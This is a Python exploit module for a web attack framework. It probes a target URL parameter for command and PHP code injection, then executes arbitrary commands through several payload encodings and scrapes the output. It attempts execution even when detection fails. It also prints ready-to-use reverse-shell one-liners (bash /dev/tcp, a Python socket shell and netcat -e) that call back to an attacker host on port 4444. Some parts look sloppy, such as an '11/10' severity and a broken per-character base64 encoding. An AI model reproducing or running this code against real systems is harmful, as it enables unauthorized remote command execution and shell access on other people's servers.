#!/usr/bin/env python3
"""
Web Remote Code Execution Exploit Module
Severity: CRITICAL (11/10)
Author: Security Research Team
"""

import requests
import urllib.parse
import base64
import re
from typing import Dict, Optional

ModuleInfo = {
    'name': 'web_rce',
    'description': 'Web-based Remote Code Execution exploit',
    'author': 'Security Research Team',
    'severity': 'CRITICAL',
    'requirements': ['requests'],
    'category': 'web'
}

class WebRCEExploit:
    """Exploit class for web RCE vulnerabilities"""
    
    def __init__(self):
        self.vulnerable_patterns = [
            r'eval\s*\(',
            r'system\s*\(',
            r'exec\s*\(',
            r'passthru\s*\(',
            r'shell_exec\s*\(',
            r'`.*`',
            r'popen\s*\(',
            r'proc_open\s*\(',
        ]
    
    def detect_vulnerability(self, url: str, param: str, test_payload: str = "1") -> bool:
        """Detect if parameter is vulnerable to RCE"""
        try:
            # Test for command injection
            test_params = {
                param: f"test; echo 'VULNERABLE';"
            }
            
            response = requests.get(url, params=test_params, timeout=5)
            if 'VULNERABLE' in response.text:
                return True
                
            # Test for PHP code injection
            php_test = {
                param: "<?php echo 'VULNERABLE'; ?>"
            }
            response = requests.get(url, params=php_test, timeout=5)
            if 'VULNERABLE' in response.text:
                return True
                
            return False
        except Exception as e:
            print(f"Error during detection: {e}")
            return False
    
    def execute_command(self, url: str, param: str, command: str, method: str = "GET") -> Optional[str]:
        """Execute command via RCE vulnerability"""
        # Multiple encoding techniques
        encodings = [
            lambda x: x,  # Raw
            lambda x: urllib.parse.quote(x),  # URL encode
            lambda x: base64.b64encode(x.encode()).decode(),  # Base64
            lambda x: ';'.join([f'echo {base64.b64encode(c.encode()).decode()}' for c in x]),  # Base64 chunks
        ]
        
        for encoding_func in encodings:
            try:
                payload = encoding_func(command)
                
                if method.upper() == "GET":
                    params = {param: payload}
                    response = requests.get(url, params=params, timeout=10)
                else:
                    data = {param: payload}
                    response = requests.post(url, data=data, timeout=10)
                
                # Extract command output
                output = self.extract_output(response.text, command)
                if output:
                    return output
                    
            except Exception as e:
                continue
        
        return None
    
    def extract_output(self, response_text: str, command: str) -> Optional[str]:
        """Extract command output from response"""
        # Look for common output patterns
        patterns = [
            r'VULNERABLE(.+?)VULNERABLE',
            r'<pre>(.+?)</pre>',
            r'<output>(.+?)</output>',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.DOTALL)
            if match:
                return match.group(1).strip()
        
        return response_text[:1000]  # Return first 1000 chars if no pattern matches
    
    def get_shell(self, url: str, param: str, method: str = "GET") -> bool:
        """Attempt to establish reverse shell"""
        # Common reverse shell payloads
        reverse_shells = [
            f"bash -i >& /dev/tcp/TARGET_IP/4444 0>&1",
            f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"TARGET_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            f"nc -e /bin/sh TARGET_IP 4444",
        ]
        
        print("Reverse shell payloads (replace TARGET_IP with your IP):")
        for i, payload in enumerate(reverse_shells, 1):
            print(f"{i}. {payload}")
        
        return True


def execute(url: str = None, param: str = None, command: str = None, **kwargs) -> Dict:
    """Main execute function for module"""
    exploit = WebRCEExploit()
    
    if not url or not param:
        return {
            'success': False,
            'error': 'URL and parameter name required',
            'usage': {
                'url': 'Target URL',
                'param': 'Vulnerable parameter name',
                'command': 'Command to execute'
            }
        }
    
    # Detect vulnerability
    print(f"[*] Testing {url} for RCE vulnerability...")
    is_vulnerable = exploit.detect_vulnerability(url, param)
    
    if not is_vulnerable:
        print("[!] Vulnerability not detected automatically, attempting anyway...")
    
    if command:
        print(f"[*] Executing command: {command}")
        result = exploit.execute_command(url, param, command)
        
        if result:
            return {
                'success': True,
                'command': command,
                'output': result
            }
        else:
            return {
                'success': False,
                'error': 'Command execution failed or no output received'
            }
    else:
        # Interactive mode
        exploit.get_shell(url, param)
        return {
            'success': True,
            'message': 'Module loaded. Use get_shell() or execute_command() methods.'
        }
